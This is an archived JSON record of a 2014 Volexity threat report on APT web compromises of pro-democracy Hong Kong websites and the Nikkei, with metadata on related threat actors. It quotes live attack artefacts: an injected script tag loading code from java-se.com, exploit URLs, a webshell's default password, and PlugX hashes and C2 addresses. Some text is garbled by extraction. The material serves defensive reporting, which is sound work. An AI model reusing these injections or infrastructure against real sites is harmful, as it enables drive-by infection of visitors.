{
    "id": "fb227f87-f9f7-4ea0-8f59-1f6059f44454",
    "created_at": "2022-10-25T16:48:17.4749Z",
    "updated_at": "2025-03-27T02:09:29.357923Z",
    "deleted_at": null,
    "sha1_hash": "9439561abc998b7f0f733142bc44f717b2615374",
    "title": "Democracy In Hong Kong Under Attack",
    "authors": "Volexity",
    "file_creation_date": "2014-10-10T03:27:02Z",
    "file_modification_date": "2014-10-10T03:27:02Z",
    "file_size": 579033,
    "plain_text": "[Posted on October 9, 2014 by Steven Adair](http://www.volexity.com/blog/?p=33)\n\nOver the last few months, Volexity has been tracking a particularly remarkable advanced persistent threat (APT) operation\ninvolving strategic web compromises of websites in Hong Kong and Japan. In both countries, the compromised websites have been\nparticularly notable for their relevance to current events and the high profile nature of the organizations involved. In particular the\n[Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear. These](https://en.wikipedia.org/wiki/Occupy_Central_with_Love_and_Peace)\ncompromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the\nimpacted websites. This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install\nmalware on their systems. While investigating these cases, Volexity also discovered additional APT attack campaigns involving\nmultiple other pro-democratic websites in Hong Kong. These attempts at exploitation, compromise, and digital surveillance are\ndetailed throughout this post.\n\n# Compromised Pro-Democratic Hong Kong Websites\n\nWarning: Many of these websites may still be compromised and present a risk to visitors. Browse with caution.\n\n**Alliance for True Democracy â€“ Hong Kong**\n\nOver the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy\n(ATD) in Hong Kong (www.atd.hk). ATD is an alliance of people and organizations dedicated to democracy and universal suffrage\nin Hong Kong. At the time of this writing malicious code is still live on the website, so please visit with care until the website is\nclean. Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named\n**superfish.js.**\n\nThis JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and\ninterpeted as:\n\n**<script language=javascript src=http://java-se.com/o.js</script>**\n\nThe domain name java-se.com is known bad and associated with APT activity. At the time of this post, the domain is hosted on the\nJapanese IP address 210.253.101.105.\n\n7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.\n\nVolexity has yet to actually see the contents of the file o.js, as the websites has continuously returned HTTP 403 responses each\ntime it was requested. The file was requested from IP addresses throughout Asia without ever returning valid content. Itâ€™s\nunclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets. This\nsame code has also been observed being served from another Hong Kong website described in the next section.\n\n**Webshell Backdoor**\n\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it.\nThis is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises.\nVolexity refers to this shell as the Angel Webshell, named after its default password of â€œangelâ€​. The shell will simply display\nth t t â€ P d â€ t t i t b d L i b tt A h t f th b h ll b d th ATD b it\n\n\n-----\n\nDespite the shell being written in PHP and only displaying a simple Login prompt, it is easy to identify the Angel webshell based on\nunique components of its viewable HTML source code. The HTML source of this page is displayed in the following image.\n\nWhile Volexity operates under the assumption attackers have placed webshells on webservers they have compromised, in this\nparticular instance it can be seen with certainty. Attackers will often upload new webshells or add simple China Chopper style\nmodifications to legitimate existing files in an attempt to maintain persistence to these systems.\n\n**Democratic Party Hong Kong**\n\nIn the last week, Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong\ncompromised with the same malicious code found ont he ATD website (www.dphk.org | eng.dphk.org). DPHK is a pro-democracy\npolitical party in Hong Kong. Like the ATD website, at the time of this writing the DPHK websites are also serving up malicious\ncode, so please browse with caution. During our research for this post, we also became aware of multiple public reports related to\nthe compromise of the DPHK website on both Twitter and via ThreatConnect. Our good friend Claudio Giurianeri posted the\n[following tweet on October 3, 2014](https://twitter.com/botherder/status/517994402158227456)\n\nThe website of the Democratic Party of Hong Kong has been compromised and still is. Let them know.\n[#OccupyCentral](https://twitter.com/hashtag/OccupyCentral?src=hash)\n\nDiving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com. In\n[particular, a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP](https://twitter.com/9bplus)\naddresses associated with java-se.com. While Volexity has only observed a handful of the hostnames in the wild thus far, other\nactive subdomains suggest there could be additional on-going exploit or malware activity from the domain. Additional reporting on\n[this activity and another going back to August 2014 was also recently shared on ThreatConnect. Despite all of this attention, the](http://threatconnect.com/)\nDPHK website is still compromised and references the JavaScript from the hostile domain.\n\nIt is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise. Back in\n[May 2011, Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits. The DPHK appears to be of](https://securelist.com/blog/incidents/30644/democratic-party-of-hong-kong-website-compromised-and-serving-spyware/)\nhigh value with respect to targeting visitors.\n\n**People Power â€“ Hong Kong**\n\nDuring the course of investigating activity related to the ATD and DPHK websites, Volexity also observed that the website of the\npolitical coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk) had been compromised as\nwell. However, unlike the other two websites, the People Power website did not contain JavaScript modifications pointing to javase.com. Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so. At the bottom of\nseveral of the pages for the People Power website are four iFrames as seen in this screen shot of the website source:\n\nThose links, with the exception of the first one, all redirect to exploit pages on the Hong Kong IP address 58.64.178.77.\n\n**URL** **M t R f** **h P**\n\n\n-----\n\n|hXXp://985.so/bUYj hXXp://985.so/bUYe|N/A (HTTP 404) hXXp://58.64.178.77:80/SiteLoader|\n|---|---|\n|hXXp://985.so/b6hW|hXXp://58.64.178.77/mPlayer|\n|hXXp://985.so/bUYf|hXXp://58.64.178.77:80/0wnersh1p|\n\n\nThese pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as\nload Java exploits designed to install malware on the target system. If successful, the exploits will install either a 32-bit or 64-bit\nversion of the malware. Both files are found within the Java Archives files. Below are details on each of the malware files.\n\n**Filename: main.dll**\n**File size: 13824 bytes**\n**MD5 hash: 1befa2c2d1bfc8e87d52871c868f75fe**\n**SHA1 hash: 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817**\n**Notes: 32-bit version of malware, which beacons to 58.64.178.77:443.**\n\n**Filename: main64.dll**\n**File size: 15872 bytes**\n**MD5 hash: a482a84d13c76b950ce5bc7e75f4edef**\n**SHA1 hash: c0a4b9145e0066f5c1534beddc9c666ea8eb0882**\n**Notes: 64-bit version of malware, which beacons to 58.64.178.77:443.**\n\nAt the time of this writing, the People Power website is still serving up malicious code. Volexity recommends avoiding this website\nand/or browsing with caution. Volexity believes a separate group of attackers is responsible for this exploit activity and that they are\nnot affiliated with the java-se.com operations.\n\n**The Professional Commons â€“ Hong Kong**\n\nWhile digging deeper into pro-democratic websites in Hong Kong, Volexity also discovered peculiar code on the website of a prodemocratic and pro-universal suffrage public policy think thank The Professional Commons (www.procommons.org.hk). In the\ncase of this website, there is suspicious JavaScript code that writes an iFrame pointing back to a non-existent HTML page on a hotel\nwebsite in South Korea. The code from the website can be seen in the screen shot below.\n\nThe URL in question points to:\n\nhXXp://www.hotel365.co.kr/Lnk/tw/index.html\n\nThis link does not work and will redirect a visitor back to the main page of the website. There does not appear to be any reason for\nthe Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code. It is suspected\nthat this was a formerly active exploit URL. If it is actually malicious, it is possible the code could be re-activated at any time.\nVolexity recommend the URL and the Professional Commons website be browsed with caution.\n\n# High Profile Compromised Japanese Website\n\n**The Japanese Nikkei**\n\nIn early September, the APT group behind java-se.com raised its visibility on Volexityâ€™s radar following a compromise that\neffectively impacted many components of the Japanese Nikkei. In the first week of September, a subdomain used to load JavaScript\ncode and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised. In\nparticular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com\nhosted on the Japanese IP address 211.125.81.203.\n\n7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC.\n\n\n-----\n\nLike the JavaScript from the ATD and DPHK websites, Volexity was never actually able to obtain a live copy of this script. Each\nrequest results in an HTTP 403 response from the server. Volexity suspects the code was either active at select times and/or was\nonly served to a subset of visitors. The code has not been observed on the s_cDS.js file for nearly a month now.\n\n# Live Exploits, Stolen Certificates, and Signed Malware\n\nWhile tracking this APT activity, Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong\nand Japan associated with the java-se.com activity. Despite several sites being compromised, the above activity tied to java-se.com\ndid not result in the successful capture of actual exploit code or malware. However, research into other websites and activity\ninvolving java-se.com did lead Volexity to live exploits and malware. In particular Volexity came across live exploit code hosted at\n**jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200.**\n\n7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.\n\nThis system hosted a JavaScript file, which in turned loads a malicious Java Applet. In testing the the Java Applet pops up a\nnotification to the user asking them if they want to run the applet. Volexity has not had enough time to thoroughly analyze the file\nto see if it is an actual exploit or if the attackers rely on user assisted malware installation. The pop-up does make it appear as if the\nfile is an update to Java. The popup displayed by Java is displayed below.\n\nAs can be seen in the image above, this popup could be misconstrued by a user as an update to Java despite the java-se.com domain\nand the Publisher being listed as WindySoft. Interestingly the Java Archive being loaded is digitally signed by a certificate issued\nto WindySoft, an online gaming company from South Korea. We cannot confirm this certificate actually belonged to WindySoft at\nany point in time, however, there is fairly established precedent of certificates from online gaming companies being used to\ndigitally sign malware and attack tools.\n\n\n-----\n\nAs one might expect, choosing to press the Run button would be bad news for someone presented with this prompt. If one were to\nclick Run from this prompt, it would result in the file css.jpg being download over an encrypted channel from a folder on\n**https://elsa-jp.jp. Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely**\ncompromised. The file css.jpg is of course not a JPEG file, it is an executable that has been encoded with the single-byte XOR key\n0xFF.\n\n**Filename: css.jpg**\n**File size: 168776 bytes**\n**MD5 hash: b3a9e6548fb3cc511096af4d68b2e745**\n**SHA1 hash: 394703d1240ccd3aaeeef50c212313e3036741b1**\n**Notes: Executable file downloaded by Java Applet that has been encoded with XOR 0Ã—99**\n\nTaking a closer look at the resulting executable we have, it turns out it is a newer sample of PlugX. In this particular sample an\ninteresting and notable string was observed:\n\nC:\\wocawocawoca\\piao\\Release\\caca.pdb\n\nAlso of interest is that as observed from the Java Applet, the executable is also digitally signed by a certificate issued to â\n€œWindySoft.â€​\n\nUpon execution the malware sample immediately does a DNS resolution for the following hostname:\n\n**jduhf873jdu7.blog.163.com**\n\nThe PlugX sample connects to the blog and parses the page for a command for where to connect to next. This is very similar to the\n[method described by FireEye in their blog on Operation Poisoned Hurricane. The primary difference being that the attackers opted](http://www.fireeye.com/blog/technical/targeted-attack/2014/08/operation-poisoned-hurricane.html)\nto use a 163.com Blog over a Google Code page to embed the command. Taking a closer look at the Blog page the following post is\nobserved:\n\n\n-----\n\nThe primary string to focus on is in the title of the post:\n**DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS**\n\n[Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year, we can see this command](http://blog.cassidiancybersecurity.com/post/2014/01/plugx-some-uncovered-points.html)\ndecodes to instruct the malware to connect to a U.S.-based Linode IP address at Hurricane Electric: 173.255.217.77.\n\n6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE\n\nA look at passive DNS identifies several hostnames that recently resolved to the IP address. The ones that still resolve to the IP are\nlisted below:\n\n**dns.apasms.com**\n**ns.gpass1.org**\n**ns1.gpass1.org**\n\nThese hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm.\n\n# Conclusion\n\nAs we have seen for several years now, dissenting groups, especially those seeking increased levels of freedom frequently find\nthemselves targeted for surveillance and information extraction. In the digital age, a strategic web compromise (exploit drive-by)\nhas become a key weapon of choice for to conduct such operations. These types of attacks are far from overt, as a typical target and\nvictim opted to go on their own to what they believe should be a safe and trusted website. In the case of this post, it appears that at\nleast two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong\nKong. This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted.\nUnfortunately with the level of access and infrastructure the attackers appear to have, this is quite an uphill battle. Continuing to\nexpose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/dvtxta3jtratjxlpr5rzwsqvqfetsn6z",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.10.09.Democracy_Hong_Kong_Under_Attack/Democracy_HongKong_Under_Attack.pdf"
    ],
    "report_names": [
        "Democracy_HongKong_Under_Attack"
    ],
    "threat_actors": [
        {
            "id": "722b693d-cfdc-489e-a540-78c7d52ac5a8",
            "created_at": "2022-10-25T16:07:23.713768Z",
            "updated_at": "2025-03-27T02:02:09.940058Z",
            "deleted_at": null,
            "main_name": "Hurricane Panda",
            "aliases": [
                "Operation Poisoned Hurricane"
            ],
            "source_name": "ETDA:Hurricane Panda",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "Mimikatz",
                "SinoChopper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1412911622,
    "ts_modification_date": 1412911622,
    "files": {
        "pdf": "https://archive.orkl.eu/9439561abc998b7f0f733142bc44f717b2615374.pdf",
        "text": "https://archive.orkl.eu/9439561abc998b7f0f733142bc44f717b2615374.txt",
        "img": "https://archive.orkl.eu/9439561abc998b7f0f733142bc44f717b2615374.jpg"
    }
}